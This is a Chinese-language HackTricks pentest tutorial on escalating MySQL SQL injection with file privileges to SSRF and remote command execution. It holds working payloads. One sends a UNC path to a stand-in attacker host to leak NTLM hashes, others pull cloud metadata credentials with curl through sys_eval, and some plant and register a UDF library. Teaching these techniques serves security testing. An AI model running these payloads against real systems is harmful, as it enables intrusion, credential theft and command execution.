# MySQL文件权限到SSRF/RCE

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFT收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向[hacktricks仓库](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud仓库](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>

**帖子来源于**[**https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/#mysqlmariadbpercona**](https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/#mysqlmariadbpercona)

### 使用LOAD\_FILE/LOAD DATA/LOAD XML进行SSRF

每篇关于SQL Out of Band数据泄露的文章都会使用`LOAD_FILE()`字符串函数进行网络请求。该函数本身根据运行的操作系统和数据库启动时的设置有其自身的限制。

例如，如果未设置`secure_file_priv`全局变量，则[默认值设置为`/var/lib/mysql-files/`](https://dev.mysql.com/doc/mysql-installation-excerpt/5.7/en/linux-installation-rpm.html)，这意味着您只能使用类似`LOAD_FILE('filename')`或`LOAD DATA [LOCAL] INFILE 'filename' INTO TABLE tablename`的函数从`/var/lib/mysql-files/`目录中读取文件。要能够在此目录之外的文件上执行读取操作，必须将`secure_file_priv`选项设置为`""`，这只能通过更新数据库配置文件或将`--secure_file_priv=""`作为启动参数传递给数据库服务来完成。

![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/2.png)

然而，在`secure_file_priv`设置为`""`的情况下，我们应该能够读取系统上的其他文件，假设当前数据库用户的`file_priv`设置为`Y`并且具有文件读取权限。然而，能够使用这些函数进行网络调用非常依赖于操作系统。由于这些函数仅用于读取文件，因此可以进行的唯一与网络相关的调用是对Windows主机上的UNC路径进行调用，因为[Windows的`CreateFileA` API在访问文件时理解UNC命名约定](https://docs.microsoft.com/en-gb/windows/win32/fileio/naming-a-file)。

因此，如果目标数据库运行在Windows机器上，注入查询`x'; SELECT LOAD_FILE('\\\\attackerserver.example.com\\a.txt'); -- //`将导致Windows机器发送NTLMv2哈希值，试图与攻击者控制的`\\attackerserver.example.com`进行身份验证。

这种服务器端请求伪造（SSRF）虽然有用，但仅限于TCP端口445。您无法控制端口号，但可以从具有完全读取权限的共享中读取信息。此外，正如早期研究所示，您可以使用此有限的SSRF功能窃取哈希并将其中继以获得shell，因此它绝对有用。

![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/3.png)

### 使用用户定义函数进行远程命令执行（RCE）

MySQL数据库的另一个很酷的技术是使用外部库文件中的用户定义函数（UDF），如果这些库文件存在于特定位置或系统$PATH中，则可以从MySQL中访问这些函数。

您可以使用SQL注入来**编写一个包含可以进行网络/HTTP请求的用户定义函数的库（`.so`或`.dll`**，具体取决于Linux还是Windows），然后通过其他查询调用该函数。

然而，这也有一些限制。根据MySQL的版本（可以通过`select @@version`来识别），可以加载插件的目录受到限制。MySQL v5.0.67以下版本允许从系统路径加载库文件，如果未设置`plugin_dir`变量。现在情况已经改变，较新版本的**`plugin_dir`**变量设置为类似于`/usr/lib/mysql/plugin/`的内容，通常由root拥有。

基本上，要将自定义库加载到MySQL并通过SQL注入调用加载的库中的函数，您需要：

* 通过SQL注入能够**写入**`@@plugin_dir`指定的位置
* 当前数据库用户在`mysql.user`中的**`file_priv`**设置为**`Y`**
* 将**`secure_file_priv`**设置为**`""`**，以便您可以从网络或Web应用程序中的文件上传目录等任意位置读取库的原始字节。

假设满足了上述条件，您可以使用**传统方法将**[**流行的MySQL UDF `lib_mysqludf_sys`库**](https://github.com/mysqludf/lib\_mysqludf\_sys) **传输到数据库服务器**。然后，您将能够使用以下语法执行操作系统命令请求，例如`cURL`或`powershell wget`，以执行SSRF：

`x'; SELECT sys_eval('curl http://169.254.169.254/latest/meta-data/iam/security-credentials/'); -- //`

此库中声明了许多其他函数，可以在[此处](https://osandamalith.com/2018/02/11/mysql-udf-exploitation/)进行分析。如果您像我一样懒，可以从`/usr/share/metasploit-framework/data/exploits/mysql/`目录中的metasploit安装中获取此UDF库的副本，并开始使用。
另外，已经创建了UDF库，专门为数据库提供进行HTTP请求的能力。您可以使用[MySQL用户定义函数（UDF）进行HTTP GET/POST](https://github.com/y-ken/mysql-udf-http)来使数据库进行HTTP请求，使用以下语法：

`x'; SELECT http_get('http://169.254.169.254/latest/meta-data/iam/security-credentials/'); -- //`

您还可以[创建自己的UDF，并在渗透测试后使用它。](https://pure.security/simple-mysql-backdoor-using-user-defined-functions/)

无论如何，您需要将库传输到数据库服务器。您可以通过多种方式完成此操作：

1. 使用MySQL的`hex()`字符串函数或类似的`xxd -p filename.so | tr -d '\n'`将库的内容转换为十六进制格式，然后使用`x'; SELECT unhex(0x1234abcd12abcdef1223.....) into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so' -- //`将其转储到`@@plugin_dir`目录中。
2. 或者，将`filename.so`的内容转换为Base64，并使用`x';select from_base64("AAAABB....") into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so' -- //`。

如果`@@plugin_dir`不可写，则如果版本高于`v5.0.67`，您将无法成功。否则，将其写入路径中的其他位置，并使用以下方式从该位置加载UDF库：

* 对于`lib_mysqludf_sys`库 - `x';create function sys_eval returns string soname 'lib_mysqludf_sys.so'; -- //`
* 对于`mysql-udf-http`库 - `x';create function http_get returns string soname 'mysql-udf-http.so'; -- //`

![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/4.png)

![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/5.png)

要自动化此过程，您可以使用支持[通过`--udf-inject`选项使用自定义UDF的SQLMap](https://github.com/sqlmapproject/sqlmap/wiki/Usage)。

对于盲注SQL注入，您可以将UDF函数的输出重定向到临时表中，然后从那里读取数据，或者使用[嵌入在`sys_eval`或`sys_exec` curl命令中的DNS请求](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)。

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 您在**网络安全公司**工作吗？您想在HackTricks中看到您的**公司广告**吗？或者您想获得最新版本的PEASS或下载PDF格式的HackTricks吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFT收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks衣物**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享您的黑客技巧**。

</details>
